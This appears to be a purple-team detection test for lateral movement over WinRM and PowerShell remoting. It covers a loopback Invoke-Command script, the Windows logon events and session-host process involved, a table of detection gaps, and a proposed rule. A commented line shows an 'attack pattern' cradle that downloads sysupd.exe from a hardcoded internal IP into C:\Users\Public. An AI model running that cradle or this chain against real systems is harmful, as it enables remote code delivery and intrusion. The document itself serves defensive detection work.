# Test: Lateral movement — WinRM / PowerShell remoting

**Chain:** remote PowerShell over WinRM — the legitimate-administration lateral path red
teams love because it's expected traffic. On the target it surfaces as `wsmprovhost.exe`
hosting the remote session, plus 4648 (explicit credentials) on the source and 4624
network logons on the destination.

**Implant setup:** [`../_common/implant-build.md`](../_common/implant-build.md) — the
remote session can directly run the delivery cradle (that's the attack pattern).

**Victim (elevated PowerShell):** `.\test.ps1` — a loopback WinRM session approximates
the remote one (same session-host process on the target):

```powershell
Enable-PSRemoting -Force                       # if not enabled (server usually has it)
Invoke-Command -ComputerName localhost -ScriptBlock {
    whoami
    # attack pattern: IWR http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
}
Get-Process wsmprovhost -ErrorAction SilentlyContinue   # the session host - remote shell lives here
```

**Expected vs gap:**

| Signal | Today |
|---|---|
| `wsmprovhost.exe` process | ⚠️ process telemetry only (info event) — no rule treats it as a remote-session marker |
| 4648 explicit credentials (source side) | ❌ GAP — channel not consumed |
| 4624 LogonType 3 (destination side) | ❌ GAP — channel not consumed (noisy; needs filtering) |
| Cradle run inside the session | ✅ the cradle/launch rules fire regardless of the session host (`PROC-ENC-PS`, `SIG-*`, launch chain) |

**Fix to file:** consume 4648 (small volume, high signal); add a `PROC-WINRM-SESSION`
rule — `wsmprovhost.exe` whose cmdline contains `-Embedding` launched by
`svchost.exe -k netsvcs` (any wsmprovhost on a server where you didn't just legitimately
remoted is worth a look).

**Cleanup:** nothing persistent (session ends with the command).
